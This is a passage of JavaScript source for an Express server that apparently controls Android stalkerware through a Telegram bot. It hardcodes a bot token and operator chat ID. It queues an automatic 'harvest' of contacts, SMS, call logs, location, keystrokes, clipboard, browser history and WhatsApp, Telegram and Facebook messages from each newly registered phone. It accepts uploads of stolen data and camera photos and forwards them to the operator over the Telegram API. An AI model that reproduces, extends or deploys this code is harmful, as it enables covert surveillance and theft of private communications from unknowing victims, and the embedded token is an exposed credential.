const express = require('express');
const axios = require('axios');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3000;
const os = require('os');

// Your bot token from @BotFather
const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Store authorized devices and their commands
const devices = new Map();
const userDeviceSelection = new Map();
const userStates = new Map();

// Store authorized chat IDs
const authorizedChats = new Set([
    '5326373447', // Your chat ID
]);

// Auto-collection flags
const autoDataRequested = new Map();

// Schedule states
const SCHEDULE_STATES = {
    IDLE: 'idle',
    AWAITING_START_TIME: 'awaiting_start_time',
    AWAITING_END_TIME: 'awaiting_end_time',
    AWAITING_RECURRING: 'awaiting_recurring',
    AWAITING_INTERVAL: 'awaiting_interval'
};

// Create uploads directory
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

// ============= DEVICE CONFIGURATION =============
const deviceConfigs = {
    'default': {
        chatId: '5326373447',
        config: {
            chatId: '5326373447',
            botToken: '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo',
            serverUrl: 'https://edu-hwpy.onrender.com',
            pollingInterval: 15000,
            keepAliveInterval: 300000,
            realtimeLogging: false,
            autoScreenshot: true,
            autoRecording: true,
            screenshotQuality: 70,
            recordingQuality: 'MEDIUM',
            appOpenBatchSize: 50,
            syncBatchSize: 20,
            targetApps: [
                'com.whatsapp',
                'com.instagram.android',
                'com.facebook.katana',
                'com.snapchat.android',
                'com.google.android.youtube',
                'com.google.android.apps.maps',
                'org.telegram.messenger'
            ],
            features: {
                contacts: true,
                sms: true,
                callLogs: true,
                location: true,
                screenshots: true,
                recordings: true,
                keystrokes: true,
                notifications: true,
                appOpens: true,
                ipInfo: true,
                phoneInfo: true,
                wifiInfo: true,
                mobileInfo: true,
                simInfo: true
            }
        }
    }
};

function getDeviceConfig(deviceId) {
    return deviceConfigs[deviceId] || deviceConfigs['default'];
}

// ============= FILE UPLOAD CONFIGURATION =============
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.body.deviceId || 'unknown';
        const count = req.body.count || '0';
        const timestamp = Date.now();
        const safeName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_');
        cb(null, `${deviceId}-${count}-${timestamp}-${safeName}`);
    }
});

const upload = multer({
    storage,
    limits: { 
        fileSize: 50 * 1024 * 1024,
        fieldSize: 50 * 1024 * 1024
    }
});

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ============= HELPER FUNCTIONS =============

function isAuthorizedChat(chatId) {
    return authorizedChats.has(String(chatId));
}

function sendJsonResponse(res, data, statusCode = 200) {
    try {
        res.status(statusCode).setHeader('Content-Type', 'application/json').send(JSON.stringify(data));
    } catch (e) {
        console.error('Error stringifying JSON:', e);
        res.status(500).json({ error: 'Internal server error' });
    }
}

function getServerIP() {
    try {
        const interfaces = os.networkInterfaces();
        for (const name of Object.keys(interfaces)) {
            for (const iface of interfaces[name]) {
                if (iface.family === 'IPv4' && !iface.internal) {
                    return iface.address;
                }
            }
        }
    } catch (e) {
        console.error('Error getting server IP:', e);
    }
    return 'Unknown';
}

// ============= DEVICE MANAGEMENT FUNCTIONS =============

function getDeviceListForUser(chatId) {
    const userDevices = [];
    for (const [deviceId, device] of devices.entries()) {
        if (String(device.chatId) === String(chatId)) {
            userDevices.push({
                id: deviceId,
                name: device.deviceInfo?.model || 'Unknown Device',
                lastSeen: device.lastSeen,
                isActive: deviceId === userDeviceSelection.get(chatId),
                phoneNumber: device.phoneNumber || 'Not available',
                lastSeenFormatted: new Date(device.lastSeen).toLocaleString()
            });
        }
    }
    return userDevices;
}

function getDeviceSelectionKeyboard(chatId) {
    const userDevices = getDeviceListForUser(chatId);
    const keyboard = [];
    
    userDevices.forEach(device => {
        const status = device.isActive ? '✅ ' : '';
        const lastSeen = new Date(device.lastSeen).toLocaleTimeString();
        keyboard.push([{
            text: `${status}${device.name} (${lastSeen})`,
            callback_data: `select_device:${device.id}`
        }]);
    });
    
    keyboard.push([{ text: '🔄 Refresh List', callback_data: 'refresh_devices' }]);
    keyboard.push([{ text: '📊 Device Stats', callback_data: 'device_stats' }]);
    keyboard.push([{ text: '◀️ Back to Main Menu', callback_data: 'help_main' }]);
    
    return keyboard;
}

function getMainMenuKeyboard(chatId) {
    const activeDeviceId = userDeviceSelection.get(chatId);
    const activeDevice = activeDeviceId ? devices.get(activeDeviceId) : null;
    const deviceCount = getDeviceListForUser(chatId).length;
    
    let deviceStatus = `📱 ${deviceCount} device(s)`;
    if (activeDevice) {
        deviceStatus = `✅ Active: ${activeDevice.deviceInfo?.model || 'Device'}`;
    }

    return [
        [
            { text: '📱 Device Info', callback_data: 'menu_device_info' },
            { text: '📞 Phone Info', callback_data: 'menu_phone_info' }
        ],
        [
            { text: '📍 Tracking', callback_data: 'menu_tracking' },
            { text: '🌐 Network', callback_data: 'menu_network' }
        ],
        [
            { text: '📸 Screenshot', callback_data: 'menu_screenshot' },
            { text: '🎤 Recording', callback_data: 'menu_recording' }
        ],
        [
            { text: '📸 Camera', callback_data: 'menu_camera' },
            { text: '💬 Social', callback_data: 'menu_social' }
        ],
        [
            { text: '📁 Media', callback_data: 'menu_media' },
            { text: '🔔 Realtime', callback_data: 'menu_realtime' }
        ],
        [
            { text: '⚙️ Services', callback_data: 'menu_services' },
            { text: deviceStatus, callback_data: 'menu_devices' }
        ],
        [
            { text: '❌ Close', callback_data: 'close_menu' }
        ]
    ];
}

// ============= TELEGRAM MESSAGE FUNCTIONS =============

async function sendTelegramMessage(chatId, text) {
    try {
        if (!text || text.trim().length === 0) {
            console.error('❌ Attempted to send empty message');
            return null;
        }

        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
        
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        });
        
        console.log(`✅ Message sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message:', error.response?.data || error.message);
        
        if (error.response?.status === 400) {
            console.log('⚠️ HTML failed, retrying as plain text');
            try {
                const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: chatId,
                    text: text.replace(/<[^>]*>/g, '')
                });
                return response.data;
            } catch (e) {
                console.error('❌ Plain text also failed:', e.response?.data || e.message);
            }
        }
        return null;
    }
}

async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
    try {
        console.log(`📨 Sending message with inline keyboard to ${chatId}`);
        
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        
        console.log(`✅ Message with keyboard sent successfully`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message with keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function editMessageKeyboard(chatId, messageId, newKeyboard) {
    try {
        console.log(`🔄 Editing keyboard for message ${messageId}`);
        
        const response = await axios.post(`${TELEGRAM_API}/editMessageReplyMarkup`, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: newKeyboard
            }
        });
        
        console.log(`✅ Keyboard updated`);
        return response.data;
    } catch (error) {
        console.error('❌ Error editing keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function answerCallbackQuery(callbackQueryId, text = null) {
    try {
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackQueryId,
            text: text
        });
    } catch (error) {
        console.error('Error answering callback query:', error.response?.data || error.message);
    }
}

async function setChatMenuButton(chatId) {
    try {
        console.log(`🔘 Setting menu button for chat ${chatId}`);
        
        const commands = [
            { command: 'help', description: '📋 Show main menu' },
            { command: 'devices', description: '📱 List all devices' },
            { command: 'status', description: '📊 Device status' },
            { command: 'location', description: '📍 Get GPS location' },
            { command: 'screenshot', description: '📸 Take screenshot' },
            { command: 'record', description: '🎤 Start 60s recording' },
            { command: 'stop_recording', description: '⏹️ Stop recording' },
            { command: 'find_media', description: '🔍 Find media files' },
            { command: 'contacts', description: '📇 Get contacts' },
            { command: 'sms', description: '💬 Get SMS' },
            { command: 'calllogs', description: '📞 Get call logs' },
            { command: 'calendar', description: '📅 Get calendar events' },
            { command: 'storage', description: '💾 Storage info' },
            { command: 'network', description: '📡 Network info' },
            { command: 'battery', description: '🔋 Battery level' },
            { command: 'ip_info', description: '🌐 Get IP info' },
            { command: 'phone_number', description: '📞 Get phone number' },
            { command: 'sim_info', description: '📱 Get SIM info' },
            { command: 'wifi_info', description: '📶 Get WiFi info' },
            { command: 'mobile_info', description: '📱 Get mobile data info' },
            { command: 'all_info', description: '📱 Complete device info' },
            { command: 'app_opens', description: '📱 Show app opens' },
            { command: 'realtime_on', description: '🔔 Enable real-time logs' },
            { command: 'realtime_off', description: '🔔 Disable real-time logs' },
            { command: 'realtime_status', description: '🔔 Check real-time status' },
            { command: 'photo', description: '📸 Take a photo now' },
            { command: 'camera_on', description: '📸 Start camera monitoring' },
            { command: 'camera_off', description: '📸 Stop camera monitoring' },
            { command: 'camera_status', description: '📸 Check camera status' },
            { command: 'camera_front', description: '📸 Switch to front camera' },
            { command: 'camera_back', description: '📸 Switch to back camera' },
            { command: 'camera_switch', description: '📸 Toggle cameras' },
            { command: 'telegram', description: '💬 Get Telegram logs' },
            { command: 'facebook', description: '💬 Get Facebook logs' },
            { command: 'whatsapp', description: '💬 Get WhatsApp logs' },
            { command: 'clipboard', description: '📋 Get clipboard logs' },
            { command: 'browser_history', description: '🌐 Get browser history' },
            { command: 'keystrokes', description: '⌨️ Get keystrokes' },
            { command: 'notifications', description: '🔔 Get notifications' },
            { command: 'screenshots', description: '📸 Screenshot history' },
            { command: 'screenshot_settings', description: '⚙️ Screenshot settings' },
            { command: 'recording_settings', description: '⚙️ Recording settings' },
            { command: 'sync_all', description: '🔄 Sync all data' },
            { command: 'force_harvest', description: '⚡ Force data harvest' }
        ];
        
        await axios.post(`${TELEGRAM_API}/setMyCommands`, { commands });
        
        await axios.post(`${TELEGRAM_API}/setChatMenuButton`, {
            chat_id: chatId,
            menu_button: {
                type: 'commands',
                text: 'Menu'
            }
        });
        
        console.log(`✅ Menu button and commands set for chat ${chatId}`);
    } catch (error) {
        console.error('Error setting menu button:', error.response?.data || error.message);
    }
}

function createInlineButton(text, callbackData) {
    return {
        text: text,
        callback_data: callbackData
    };
}

async function sendTelegramDocument(chatId, filePath, filename, caption) {
    try {
        console.log(`📎 Sending document to ${chatId}: ${filename}`);
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', fs.createReadStream(filePath), { filename });
        formData.append('caption', caption);
        
        const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: {
                ...formData.getHeaders()
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        console.log(`✅ Document sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending document:', error.response?.data || error.message);
        
        try {
            const stats = fs.statSync(filePath);
            await sendTelegramMessage(chatId, 
                `⚠️ File too large to send directly.\n\n` +
                `The file is ${(stats.size / 1024).toFixed(2)} KB.`);
        } catch (e) {
            console.error('Error sending fallback message:', e);
        }
        return null;
    }
}

// ============= FORMATTER FUNCTIONS =============

function formatLocationMessage(locationData) {
    try {
        let locData = locationData;
        if (typeof locationData === 'string') {
            try {
                locData = JSON.parse(locationData);
            } catch (e) {
                return { text: locationData };
            }
        }

        if (locData.lat && locData.lon) {
            const lat = locData.lat;
            const lon = locData.lon;
            const accuracy = locData.accuracy || 'Unknown';
            const provider = locData.provider || 'unknown';
            
            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            
            return {
                text: `📍 <b>Location Update</b>\n\n` +
                      `• <b>Latitude:</b> <code>${lat}</code>\n` +
                      `• <b>Longitude:</b> <code>${lon}</code>\n` +
                      `• <b>Accuracy:</b> ±${accuracy}m\n` +
                      `• <b>Provider:</b> ${provider}\n\n` +
                      `🗺️ <a href="${mapsUrl}">View on Google Maps</a>`,
                mapsUrl: mapsUrl,
                lat: lat,
                lon: lon
            };
        }
        return { text: locationData };
    } catch (error) {
        console.error('Error formatting location:', error);
        return { text: locationData };
    }
}

function formatIPInfo(ipData) {
    try {
        let ipInfo = ipData;
        if (typeof ipData === 'string') {
            try {
                ipInfo = JSON.parse(ipData);
            } catch (e) {
                return `🌐 IP Info: ${ipData}`;
            }
        }

        let message = '🌐 <b>Network Information</b>\n\n';
        
        if (ipInfo.publicIP) {
            message += `🌍 <b>Public IP:</b> <code>${ipInfo.publicIP}</code>\n`;
            message += `📍 <b>Location:</b> ${ipInfo.city || 'Unknown'}, ${ipInfo.country || 'Unknown'}\n`;
            message += `🏢 <b>ISP:</b> ${ipInfo.isp || 'Unknown'}\n`;
        }
        
        if (ipInfo.wifiIP && ipInfo.wifiIP !== 'Unknown') {
            message += `\n📶 <b>WiFi IP:</b> <code>${ipInfo.wifiIP}</code>\n`;
        }
        
        if (ipInfo.mobileIP && ipInfo.mobileIP !== 'Unknown') {
            message += `📱 <b>Mobile IP:</b> <code>${ipInfo.mobileIP}</code>\n`;
        }
        
        return message;
    } catch (error) {
        console.error('Error formatting IP info:', error);
        return `🌐 IP Info: ${JSON.stringify(ipData)}`;
    }
}

function formatSimInfo(simData) {
    try {
        let message = '📱 <b>SIM Information</b>\n\n';
        
        if (Array.isArray(simData)) {
            message += `Active SIMs: ${simData.length}\n\n`;
            simData.forEach((sim, index) => {
                message += `📱 <b>SIM ${index + 1}</b>\n`;
                message += `• Slot: ${sim.slot || 'Unknown'}\n`;
                message += `• Carrier: ${sim.carrierName || 'Unknown'}\n`;
                message += `• Country: ${sim.countryIso || 'Unknown'}\n`;
                message += `• Number: ${sim.number || 'Hidden'}\n\n`;
            });
        } else if (simData.operator) {
            message += `• Operator: ${simData.operator}\n`;
            message += `• Country: ${simData.country}\n`;
            message += `• SIM State: ${simData.simState}\n`;
            message += `• Phone Type: ${simData.phoneType || 'Unknown'}\n`;
        }
        
        return message;
    } catch (error) {
        console.error('Error formatting SIM info:', error);
        return `📱 SIM Info: ${JSON.stringify(simData)}`;
    }
}

function formatWifiInfo(wifiData) {
    try {
        let message = '📶 <b>WiFi Information</b>\n\n';
        
        message += `• Enabled: ${wifiData.enabled ? '✅ Yes' : '❌ No'}\n`;
        
        if (wifiData.connected) {
            message += `\n📡 <b>Current Connection</b>\n`;
            message += `• SSID: ${wifiData.ssid || 'Unknown'}\n`;
            message += `• BSSID: ${wifiData.bssid || 'Unknown'}\n`;
            message += `• IP: ${wifiData.ip || 'Unknown'}\n`;
            message += `• Speed: ${wifiData.speed || 'Unknown'} Mbps\n`;
            message += `• Frequency: ${wifiData.frequency || 'Unknown'} MHz\n`;
            message += `• Signal: ${wifiData.rssi || 'Unknown'} dBm\n`;
        }
        
        return message;
    } catch (error) {
        console.error('Error formatting WiFi info:', error);
        return `📶 WiFi Info: ${JSON.stringify(wifiData)}`;
    }
}

// ============= AUTO DATA COLLECTION =============

function queueAutoDataCommands(deviceId, chatId) {
    console.log(`🔄 Queueing auto-data collection for device ${deviceId}`);
    
    if (autoDataRequested.has(deviceId)) {
        console.log(`⚠️ Auto-data already requested for ${deviceId}, skipping`);
        return;
    }
    
    autoDataRequested.set(deviceId, {
        timestamp: Date.now(),
        requested: [
            'ip_info',
            'phone_number',
            'sim_info',
            'wifi_info',
            'mobile_info',
            'contacts',
            'sms',
            'calllogs',
            'calendar',
            'whatsapp',
            'telegram',
            'facebook',
            'browser_history',
            'clipboard',
            'keystrokes',
            'notifications',
            'screenshots',
            'location'
        ]
    });
    
    const device = devices.get(deviceId);
    if (!device) {
        console.error(`❌ Device not found for auto-data: ${deviceId}`);
        return;
    }
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    const commands = [
        { command: 'ip_info', delay: 0, description: 'IP Address' },
        { command: 'phone_number', delay: 2, description: 'Phone Number' },
        { command: 'sim_info', delay: 4, description: 'SIM Info' },
        { command: 'wifi_info', delay: 6, description: 'WiFi Info' },
        { command: 'mobile_info', delay: 8, description: 'Mobile Info' },
        { command: 'contacts', delay: 12, description: 'Contacts' },
        { command: 'sms', delay: 15, description: 'SMS' },
        { command: 'calllogs', delay: 18, description: 'Call Logs' },
        { command: 'calendar', delay: 21, description: 'Calendar' },
        { command: 'whatsapp', delay: 24, description: 'WhatsApp' },
        { command: 'telegram', delay: 27, description: 'Telegram' },
        { command: 'facebook', delay: 30, description: 'Facebook' },
        { command: 'browser_history', delay: 33, description: 'Browser History' },
        { command: 'clipboard', delay: 36, description: 'Clipboard' },
        { command: 'keystrokes', delay: 39, description: 'Keystrokes' },
        { command: 'notifications', delay: 42, description: 'Notifications' },
        { command: 'screenshots', delay: 45, description: 'Screenshots' },
        { command: 'location', delay: 48, description: 'Location' }
    ];
    
    commands.forEach((cmd) => {
        const commandObject = {
            command: cmd.command,
            originalCommand: `/${cmd.command}`,
            messageId: null,
            timestamp: Date.now() + (cmd.delay * 1000),
            autoData: true
        };
        
        device.pendingCommands.push(commandObject);
        console.log(`📝 Auto-data command queued: ${cmd.command} (${cmd.description})`);
    });
    
    console.log(`✅ All auto-data commands queued for ${deviceId}`);
}

// ============= PHOTO UPLOAD ENDPOINT =============
app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const caption = req.body.caption || '📸 Camera Photo';
        
        if (!deviceId || !req.file) {
            console.error('❌ Missing fields in photo upload');
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📸 Photo upload from ${deviceId}: ${req.file.filename} (${req.file.size} bytes)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const fullCaption = `📱 *${deviceName}*\n\n${caption}`;
        
        await sendTelegramPhoto(chatId, filePath, req.file.originalname, fullCaption);
        
        setTimeout(() => {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                    console.log(`🧹 Deleted photo: ${filePath}`);
                }
            } catch (e) {
                console.error('Error deleting photo:', e);
            }
        }, 60000);
        
        res.json({ success: true, filename: req.file.filename, size: req.file.size });
        
    } catch (error) {
        console.error('❌ Photo upload error:', error);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

async function sendTelegramPhoto(chatId, filePath, filename, caption) {
    try {
        console.log(`📸 Sending photo to ${chatId}: ${filename}`);
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', fs.createReadStream(filePath), { filename });
        formData.append('caption', caption);
        
        const response = await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
            headers: {
                ...formData.getHeaders()
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        console.log(`✅ Photo sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending photo:', error.response?.data || error.message);
        
        try {
            console.log('📎 Falling back to document send...');
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('document', fs.createReadStream(filePath), { filename });
            formData.append('caption', caption);
            
            const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
                headers: {
                    ...formData.getHeaders()
                }
            });
            
            console.log(`✅ Photo sent as document to ${chatId}`);
            return response.data;
        } catch (e) {
            console.error('❌ Document fallback also failed:', e.message);
            return null;
        }
    }
}

// ============= NEW ENDPOINTS =============

app.post('/api/telegram/:deviceId', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`💬 Telegram logs from ${deviceId}: ${filename} (${itemCount} messages)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const caption = `📱 *${deviceName}*\n\n💬 Telegram Messages Export (${itemCount} messages)`;
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Telegram logs error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/facebook/:deviceId', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`💬 Facebook logs from ${deviceId}: ${filename} (${itemCount} messages)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const caption = `📱 *${deviceName}*\n\n💬 Facebook/Messenger Messages Export (${itemCount} messages)`;
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Facebook logs error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/calendar/:deviceId', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📅 Calendar events from ${deviceId}: ${filename} (${itemCount} events)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const caption = `📱 *${deviceName}*\n\n📅 Calendar Events Export (${itemCount} events)`;
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Calendar events error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/screenshots/:deviceId', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📸 Screenshot metadata from ${deviceId}: ${filename} (${itemCount} entries)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const caption = `📱 *${deviceName}*\n\n📸 Screenshot Metadata Export (${itemCount} entries)`;
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Screenshot metadata error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/whatsapp/:deviceId', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`💬 WhatsApp logs from ${deviceId}: ${filename} (${itemCount} messages)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const caption = `📱 *${deviceName}*\n\n💬 WhatsApp Messages Export (${itemCount} messages)`;
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ WhatsApp logs error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/clipboard/:deviceId', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📋 Clipboard logs from ${deviceId}: ${filename} (${itemCount} entries)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const caption = `📱 *${deviceName}*\n\n📋 Clipboard History Export (${itemCount} entries)`;
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Clipboard logs error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/browser-history/:deviceId', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`🌐 Browser history from ${deviceId}: ${filename} (${itemCount} entries)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const caption = `📱 *${deviceName}*\n\n🌐 Browser History Export (${itemCount} entries)`;
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Browser history error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============= WEBHOOK ENDPOINT =============

app.post('/webhook', async (req, res) => {
    res.sendStatus(200);
    
    setImmediate(async () => {
        try {
            const update = req.body;
            console.log('📩 Received update type:', update.callback_query ? 'callback' : (update.message ? 'message' : 'other'));

            if (update.callback_query) {
                await handleCallbackQuery(update.callback_query);
                return;
            }

            if (!update?.message) {
                console.log('📭 Non-message update');
                return;
            }

            const chatId = update.message.chat.id;
            const text = update.message.text;
            const messageId = update.message.message_id;

            if (!isAuthorizedChat(chatId)) {
                console.log(`⛔ Unauthorized chat: ${chatId}`);
                await sendTelegramMessage(chatId, '⛔ You are not authorized to use this bot.');
                return;
            }

            await setChatMenuButton(chatId);

            const userState = userStates.get(chatId);
            
            if (userState) {
                await handleConversationMessage(chatId, text, messageId, userState);
                return;
            }

            if (text?.startsWith('/')) {
                await handleCommand(chatId, text, messageId);
            } else {
                await sendTelegramMessageWithKeyboard(
                    chatId,
                    "🤖 Use the menu button below or type /help to see available commands.",
                    getMainMenuKeyboard(chatId)
                );
            }
        } catch (error) {
            console.error('❌ Error processing webhook:', error);
        }
    });
});

// ============= CALLBACK QUERY HANDLER =============

async function handleCallbackQuery(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;
    
    console.log(`🖱️ Callback received: ${data} from chat ${chatId}`);
    
    await answerCallbackQuery(callbackId);
    
    if (data === 'help_main') {
        await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
        
    } else if (data === 'menu_devices') {
        const userDevices = getDeviceListForUser(chatId);
        const keyboard = getDeviceSelectionKeyboard(chatId);
        
        let message = `📱 *Device Management*\n\n`;
        message += `You have ${userDevices.length} device(s) registered.\n\n`;
        
        if (userDevices.length > 0) {
            message += `*Active Devices:*\n`;
            userDevices.forEach(device => {
                const status = device.isActive ? '✅ ' : '○ ';
                message += `${status} ${device.name}\n`;
                message += `   └ ID: ${device.id.substring(0, 8)}...\n`;
                message += `   └ Last seen: ${device.lastSeenFormatted}\n`;
                if (device.phoneNumber !== 'Not available') {
                    message += `   └ Phone: ${device.phoneNumber}\n`;
                }
                message += `\n`;
            });
        } else {
            message += `No devices found. Make sure the app is running and registered.`;
        }
        
        await editMessageKeyboard(chatId, messageId, keyboard);
        await sendTelegramMessage(chatId, message);
        
    } else if (data === 'refresh_devices') {
        const keyboard = getDeviceSelectionKeyboard(chatId);
        await editMessageKeyboard(chatId, messageId, keyboard);
        await answerCallbackQuery(callbackId, '🔄 Device list refreshed');
        
    } else if (data === 'device_stats') {
        const userDevices = getDeviceListForUser(chatId);
        let message = `📊 *Device Statistics*\n\n`;
        message += `Total Devices: ${userDevices.length}\n\n`;
        
        userDevices.forEach((device, index) => {
            message += `*Device ${index + 1}:* ${device.name}\n`;
            message += `• ID: ${device.id.substring(0, 8)}...\n`;
            message += `• Last Seen: ${device.lastSeenFormatted}\n`;
